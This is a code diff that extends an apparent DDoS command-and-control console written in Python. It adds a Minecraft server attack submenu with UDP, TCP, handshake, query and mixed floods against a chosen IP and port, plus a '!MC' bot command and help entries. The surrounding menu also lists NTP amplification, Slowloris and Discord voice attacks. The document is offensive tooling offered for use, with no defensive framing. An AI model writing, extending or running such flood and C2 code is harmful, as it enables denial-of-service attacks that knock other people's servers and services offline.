@@ -681,25 +681,27 @@ def navigate_tree(choice):
         input_attack_params('layer7/slowloris_toolkit.py', 'Slowloris Attack', needs_port=True)
     elif choice == '11':
         input_discord_params()
+    elif choice == '12':
+        input_minecraft_params()
 
     # DDOS Control
-    elif choice == '12':
+    elif choice == '13':
         ddos_menu()
 
     # Node Statistics (placeholder)
-    elif choice == '13':
+    elif choice == '14':
         print_node_stats()
 
     # Bot Configuration (placeholder)
-    elif choice == '14':
+    elif choice == '15':
         bot_configuration()
 
     # Install Dependencies
-    elif choice == '15':
+    elif choice == '16':
         install_dependencies()
 
     # Exit
-    elif choice == '16':
+    elif choice == '17':
         print("Disconnecting from C2...")
         sys.exit(0)
 
@@ -883,6 +885,147 @@ def input_discord_params():
         input(f"{RED}[C2]{RESET} Press Enter to return...")
 
     elif choice == '6':
+        return
+
+    else:
+        print(f"{RED}[ERROR]{RESET} Invalid command")
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+def input_minecraft_params():
+    """Input Minecraft Server parameters"""
+    clear_screen()
+    print_banner()
+
+    RED = '\033[91m'
+    GRAY = '\033[90m'
+    RESET = '\033[0m'
+
+    print(f"{RED}[MINECRAFT SERVER]{RESET}")
+    print()
+
+    print(f"{RED}[OPTIONS]{RESET}")
+    print(f"{GRAY}|-{RESET} 1 - UDP Flood Attack")
+    print(f"{GRAY}|-{RESET} 2 - TCP Connection Flood")
+    print(f"{GRAY}|-{RESET} 3 - Protocol Handshake Flood")
+    print(f"{GRAY}|-{RESET} 4 - Query Protocol Flood")
+    print(f"{GRAY}|-{RESET} 5 - Mixed Attack (All Methods)")
+    print(f"{GRAY}|-{RESET} 6 - Server Information")
+    print(f"{GRAY}|-{RESET} 7 - Return to C2 Menu")
+    print()
+
+    choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()
+
+    if choice == '1':
+        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
+        port = input(f"{RED}[PORT]{RESET} Enter target port (default 25565): ").strip()
+        if not port:
+            port = "25565"
+        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
+        if not duration:
+            duration = "30"
+        threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 50): ").strip()
+        if not threads:
+            threads = "50"
+        packet_size = input(f"{RED}[PACKET SIZE]{RESET} Enter packet size (default 1024): ").strip()
+        if not packet_size:
+            packet_size = "1024"
+        print()
+        animated_loader(f"Target locked: {ip}:{port}", 0.5)
+        animated_loader(f"Attack duration: {duration}s", 0.3)
+        animated_loader(f"Thread count: {threads}", 0.3)
+        animated_loader(f"Packet size: {packet_size}", 0.3)
+        print()
+        run_tool_with_args('layer7/minecraft_toolkit.py', 'udp', ip, port, duration, threads, packet_size)
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '2':
+        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
+        port = input(f"{RED}[PORT]{RESET} Enter target port (default 25565): ").strip()
+        if not port:
+            port = "25565"
+        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
+        if not duration:
+            duration = "30"
+        threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 50): ").strip()
+        if not threads:
+            threads = "50"
+        print()
+        animated_loader(f"Target locked: {ip}:{port}", 0.5)
+        animated_loader(f"Attack duration: {duration}s", 0.3)
+        animated_loader(f"Thread count: {threads}", 0.3)
+        print()
+        run_tool_with_args('layer7/minecraft_toolkit.py', 'tcp', ip, port, duration, threads)
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '3':
+        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
+        port = input(f"{RED}[PORT]{RESET} Enter target port (default 25565): ").strip()
+        if not port:
+            port = "25565"
+        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
+        if not duration:
+            duration = "30"
+        threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 50): ").strip()
+        if not threads:
+            threads = "50"
+        print()
+        animated_loader(f"Target locked: {ip}:{port}", 0.5)
+        animated_loader(f"Attack duration: {duration}s", 0.3)
+        animated_loader(f"Thread count: {threads}", 0.3)
+        print()
+        run_tool_with_args('layer7/minecraft_toolkit.py', 'protocol', ip, port, duration, threads)
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '4':
+        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
+        port = input(f"{RED}[PORT]{RESET} Enter target port (default 25565): ").strip()
+        if not port:
+            port = "25565"
+        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
+        if not duration:
+            duration = "30"
+        threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 50): ").strip()
+        if not threads:
+            threads = "50"
+        print()
+        animated_loader(f"Target locked: {ip}:{port}", 0.5)
+        animated_loader(f"Attack duration: {duration}s", 0.3)
+        animated_loader(f"Thread count: {threads}", 0.3)
+        print()
+        run_tool_with_args('layer7/minecraft_toolkit.py', 'query', ip, port, duration, threads)
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '5':
+        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
+        port = input(f"{RED}[PORT]{RESET} Enter target port (default 25565): ").strip()
+        if not port:
+            port = "25565"
+        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
+        if not duration:
+            duration = "30"
+        threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 100): ").strip()
+        if not threads:
+            threads = "100"
+        print()
+        animated_loader(f"Target locked: {ip}:{port}", 0.5)
+        animated_loader(f"Attack duration: {duration}s", 0.3)
+        animated_loader(f"Thread count: {threads}", 0.3)
+        print()
+        run_tool_with_args('layer7/minecraft_toolkit.py', 'mixed', ip, port, duration, threads)
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '6':
+        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
+        port = input(f"{RED}[PORT]{RESET} Enter target port (default 25565): ").strip()
+        if not port:
+            port = "25565"
+        print()
+        animated_loader(f"Retrieving server information...", 1)
+        print()
+        run_tool_with_args('layer7/minecraft_toolkit.py', 'info', ip, port)
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '7':
         return
 
     else:
@@ -1282,6 +1425,7 @@ def print_help():
     print(f"{GRAY}!NTP <ntp_servers> <duration> <requests>{RESET}    {GRAY}NTP Amplification{RESET}")
     print(f"{GRAY}!SLOW <ip> <port> <duration> <requests>{RESET}    {GRAY}Slowloris Attack{RESET}")
     print(f"{GRAY}!VOICE <ip> <port> <duration> <threads> <packets>{RESET} {GRAY}Discord Voice Attack{RESET}")
+    print(f"{GRAY}!MC <ip> <port> <duration> <threads> <method>{RESET} {GRAY}Minecraft Server Attack{RESET}")
     print()
     print(f"{RED}[UTILITY]{RESET}")
     print(f"{GRAY}!HELP{RESET}                                        {GRAY}Show this menu{RESET}")
@@ -1293,6 +1437,7 @@ def print_help():
     print(f"{GRAY}!UDP 192.168.1.1 53 30 1000{RESET}")
     print(f"{GRAY}!HTTP http://example.com 30 1000{RESET}")
     print(f"{GRAY}!VOICE 104.29.145.248 19298 30 50 1000{RESET}")
+    print(f"{GRAY}!MC 192.168.1.1 25565 30 50 udp{RESET}")
     print()
 
 def parse_command(cmd):
@@ -1407,6 +1552,19 @@ def execute_command(command, args):
         print(f"{RED}[VOICE]{RESET} {GRAY}Starting Discord Voice Attack on {ip}:{port}{RESET}")
         run_tool_with_args('layer7/discord_toolkit.py', 'attack', ip, port, duration, threads, packets)
 
+    elif command == '!MC':
+        if len(args) < 4:
+            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !MC <ip> <port> <duration> <threads> [method]{RESET}")
+            print(f"{GRAY}Methods: udp, tcp, protocol, query, mixed{RESET}")
+            return
+        ip = args[0]
+        port = args[1]
+        duration = args[2]
+        threads = args[3]
+        method = args[4] if len(args) > 4 else 'mixed'
+        print(f"{RED}[MC]{RESET} {GRAY}Starting Minecraft {method.upper()} Attack on {ip}:{port}{RESET}")
+        run_tool_with_args('layer7/minecraft_toolkit.py', method, ip, port, duration, threads)
+
     else:
         print(f"{RED}[ERROR]{RESET} {GRAY}Unknown command. Type !HELP for available commands.{RESET}")
 
@@ -1440,17 +1598,18 @@ def c2_menu():
         print(f"{GRAY}|-{RESET} 9 - NTP Amplification")
         print(f"{GRAY}|-{RESET} 10 - Slowloris Attack")
         print(f"{GRAY}|-{RESET} 11 - Discord Voice Toolkit")
+        print(f"{GRAY}|-{RESET} 12 - Minecraft Server Toolkit")
         print()
 
         print(f"{RED}[DDOS CONTROL]{RESET}")
-        print(f"{GRAY}|-{RESET} 12 - Attack Control Panel")
+        print(f"{GRAY}|-{RESET} 13 - Attack Control Panel")
         print()
 
         print(f"{RED}[SYSTEM]{RESET}")
-        print(f"{GRAY}|-{RESET} 13 - Node Statistics")
-        print(f"{GRAY}|-{RESET} 14 - Bot Configuration")
-        print(f"{GRAY}|-{RESET} 15 - Install Dependencies")
-        print(f"{GRAY}|-{RESET} 16 - Exit")
+        print(f"{GRAY}|-{RESET} 14 - Node Statistics")
+        print(f"{GRAY}|-{RESET} 15 - Bot Configuration")
+        print(f"{GRAY}|-{RESET} 16 - Install Dependencies")
+        print(f"{GRAY}|-{RESET} 17 - Exit")
         print()
 
         choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()
